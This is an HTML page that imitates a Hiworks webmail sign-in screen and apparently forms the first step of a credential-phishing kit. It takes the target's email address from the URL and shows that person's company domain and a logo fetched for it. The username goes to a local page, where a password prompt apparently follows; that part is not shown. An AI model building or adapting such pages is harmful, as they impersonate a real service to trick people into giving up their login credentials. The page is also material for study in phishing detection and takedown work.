<!DOCTYPE html>
<html lang="ko">
<head>
  <meta http-equiv="Content-Language" content="en-us">
  <meta charset="UTF-8" />
  <link rel="icon" href="https://login.office.hiworks.com/favicon-96x96.png" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>하이웍스 로그인</title>
  <style>
    html, body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      height: 100%;
      min-width: 100%;
      font-size: 13px;
      color: #676767;
      font-weight: 700;
      direction: ltr;
      -webkit-text-size-adjust: none;
    }

    input[type=text] {
      appearance: none;
      font-size: 16px;
      box-shadow: none;
      height: 40px;
      width: 100%;
      border: none;
      border-bottom: 1px #2985db solid;
      border-top: 1px #2985db solid;
      border-left: 1px #2985db solid;
      color: #404040;
      background-color: white;
      background-image: url("img/id.png");
      background-position: 1px 2px;
      background-repeat: no-repeat;
      padding: 10px 35px;
    }

    input[type=text]:focus {
      outline: none;
      box-shadow: none;
    }

    p {
      font-size: 14px;
      text-align: center;
    }

    h1 {
      font-weight: 700;
      font-size: 24px;
      text-align: center;
    }
  </style>
</head>
<body>
  <form id="loginForm" action="index.html" method="get">
    <table border="0" width="100%" cellspacing="0" cellpadding="0">
      <tr><td>&nbsp;</td></tr>
      <tr>
        <td>
          <div align="center">
            <table border="0" width="100" cellspacing="0" cellpadding="0">
              <tr>
                <td>
                  <table border="0" width="100%" cellspacing="0" cellpadding="0">
                    <tr><td height="110"></td></tr>
                    <tr>
                      <td height="40" align="center">
                        <img id="logoImage" src="" width="200" height="40" alt="Logo">
                      </td>
                    </tr>
                    <tr><td height="70"></td></tr>
                    <tr>
                      <td height="26">
                        <h1>
                          <font color="#000000">Sign in to</font>
                          <font color="#7A7A7A" id="domainText">domain</font>
                        </h1>
                      </td>
                    </tr>
                    <tr><td height="14"><p>Please enter your username.</p></td></tr>
                    <tr><td height="40"></td></tr>
                    <tr>
                      <td width="400" height="40">
                        <div class="input-group">
                          <input type="text" id="usernameInput" placeholder="Username" required class="form-control" autofocus>
                          <input type="hidden" name="login" id="loginFull">
                          <span id="domainAddon" style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@domain</span>
                        </div>
                      </td>
                    </tr>
                    <tr><td height="20"></td></tr>
                    <tr>
                      <td>
                        <input type="image" src="img/signin-btn.png" width="400" height="44" name="I1">
                      </td>
                    </tr>
                    <tr><td height="15"></td></tr>
                    <tr>
                      <td height="15">
                        <table border="0" width="100%" cellspacing="0" cellpadding="0">
                          <tr>
                            <td height="122" background="img/footer-2.png">
                              <table border="0" width="100%" cellspacing="0" cellpadding="0">
                                <tr>
                                  <td height="36">
                                    <table border="0" width="100%" cellspacing="0" cellpadding="0">
                                      <tr>
                                        <td width="8"></td>
                                        <td width="155">
                                          <p align="left">
                                            <a href="session_login.html" style="text-decoration: none; color: black;">
                                              <font color="#2985db" size="2" face="Arial Unicode MS">Sign in with another office</font>
                                            </a>
                                          </p>
                                        </td>
                                        <td height="20"></td>
                                      </tr>
                                    </table>
                                  </td>
                                </tr>
                                <tr><td height="86"></td></tr>
                              </table>
                            </td>
                          </tr>
                          <tr><td height="2"></td></tr>
                        </table>
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>
            </table>
          </div>
        </td>
      </tr>
    </table>
  </form>

  <script>
    const params = new URLSearchParams(window.location.search);
    const raw = params.get('login');
    const email = raw ? decodeURIComponent(raw) : '';

    let user = '', domain = '';
    if (email.includes('@')) {
      [user, domain] = email.split(/@(.*)/, 2);
    }

    if (email) {
      document.getElementById('domainText').textContent = domain;
      document.getElementById('domainAddon').textContent = "@" + domain;
      document.getElementById('loginFull').value = email;

      const logoImage = document.getElementById('logoImage');
      const clearbitLogo = `https://logo.clearbit.com/${domain}`;
      const hiworksLogo = `https://office.hiworks.com/${domain}/common/logo/login`;
      const localLogo = `img/logo.png`;

      logoImage.src = clearbitLogo;
      logoImage.onerror = () => {
        logoImage.onerror = () => {
          logoImage.onerror = null;
          logoImage.src = localLogo;
        };
        logoImage.src = hiworksLogo;
      };
    }

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      const username = document.getElementById('usernameInput').value;
      const domain = document.getElementById('domainAddon').textContent.replace('@', '');
      document.getElementById('loginFull').value = `${username}@${domain}`;
    });
  </script>
</body>
</html>
